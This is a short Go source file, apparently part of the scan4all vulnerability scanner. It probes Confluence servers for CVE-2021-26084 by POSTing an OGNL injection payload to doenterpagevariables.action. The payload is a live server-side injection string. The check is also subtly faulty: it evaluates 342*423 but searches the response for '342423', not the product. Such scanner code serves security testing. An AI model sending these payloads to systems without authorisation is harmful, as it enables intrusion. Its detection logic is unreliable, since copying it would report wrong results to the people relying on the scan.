package confluence

import (
	"fmt"
	"github.com/hktalent/scan4all/pkg"
	"strings"
)

func CVE_2021_26084(u string) bool {
	if req, err := pkg.HttpRequset(u+"/pages/doenterpagevariables.action", "POST", "queryString=vvv\\u0027%2b#{342*423}%2b\\u0027ppp", false, nil); err == nil {
		if strings.Contains(req.Body, "342423") {
			pkg.GoPocLog(fmt.Sprintf("Found Confluence CVE_2021_26084|--\"%s\"\n", u))
			return true
		}
	}
	return false
}
